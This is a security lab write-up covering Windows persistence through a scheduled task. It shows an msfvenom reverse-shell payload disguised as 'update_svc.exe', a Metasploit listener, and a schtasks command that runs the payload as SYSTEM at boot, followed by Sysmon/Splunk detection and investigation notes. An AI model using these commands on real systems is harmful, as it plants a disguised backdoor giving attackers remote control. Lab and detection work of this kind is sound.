# 04 - Persistence

**MITRE ATT&CK:** T1053.005 - Scheduled Task

**Status:** Complete

---

## Objective

Establish a form of persistence on the target VM to allow for future attacks.

---

## Environment / Prerequisites
- **Attacker:** Kali
- **Target:** svc_sql
- **Starting Access:** svc_sql credentials
- **Lab Weakening Required:** N/A

---

## Attack Execution
1. Use MSFvenom to generate a payload
   - ```msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.20.X LPORT=4444 -f exe -o ~/lab/payloads/update_svc.exe```
2. Drag payload into shared drive between Windows and Kali
3. Establish a listener on Kali
```
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.20.X
set LPORT 4444
run
```
4. Run payload on Windows 11
5. Create a scheduled task (cmd)
   - ```schtasks /create /sc onstart /tn "UpdateSvc" /tr "C:\Windows\Temp\update_svc.exe" /ru SYSTEM```
6. Next time the target restarts, a meterpreter session should open in Kali
   - <img width="224" height="57" alt="Kali_Persistence" src="https://github.com/user-attachments/assets/4ae1f20a-2581-4737-860b-94428dcf90fd" />

---

## Explanation
- While the attack could simply stop at data exfiltration, establishing persistence allows for future vulnerabilites to be exploited. It also means that even if passwords are changed, Kali can still reconnect to Windows
- The MSFvenom payload creates a meterpreter session on Windows when ran by the scheduled task. When this happens, it attempts to connect to the specified host and port listed in the command. If the connection is successful, Kali will gain access to a meterpreter console.

---

## Detection Engineering

**Telemetry Source:** Sysmon

```index=wineventlog source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=3 DestinationPort=4444```

**Rationale:** Metasploit primarily uses port 4444. As a result, any metasploit-based persistence is likely to attempt a connection over port 4444. 

---

## Investigation Walkthrough

Task Creation:

<img width="557" height="401" alt="Splunk_Task_Creation" src="https://github.com/user-attachments/assets/1d2e64b1-0603-45f3-9d2f-55dc4e484aa1" />

- Knowing that svc_sql has been compromised, I would be immediately suspicious of this task. While there is nothing inherently malicious contained in the log, it would be worth investigating 'update_svc.exe' to make sure it is not a malicious program.

Connection:

<img width="422" height="398" alt="Splunk_Task_Connection" src="https://github.com/user-attachments/assets/7f766252-6d65-40fc-9263-f706ef8a56fa" />

- This log provides proof that 'update_svc.exe' is malicious. After running, it initiated a network connection to the Kali IP over port 4444. With what we know about the Kali IP and destination port, it is clear that this task needs to be removed to ensure that the attacker fully loses access to the system.

---

## Detection Gaps / Limitations
- Legitimate traffic can travel over port 4444, resulting in false positives.
- An alert could be made for scheduled tasks, but this is impractical as they have legitimate uses as well.

---

## Real-World Mitigation
- There are specific tools that can search through scheduled tasks and make sure privileges cannot be abused or escalated
- Force scheduled tasks to run under an authenticated account rather than SYSTEM

---

## Takeaways
- This step seems rather hard to detect due to the number of legitimate processes that also take advantage of scheduled tasks. Preventing persistence requires more deliberate action instead of just a one-and-done fix.
- It was shocking seeing how dangerous scheduled tasks can be if they have administrator privileges.


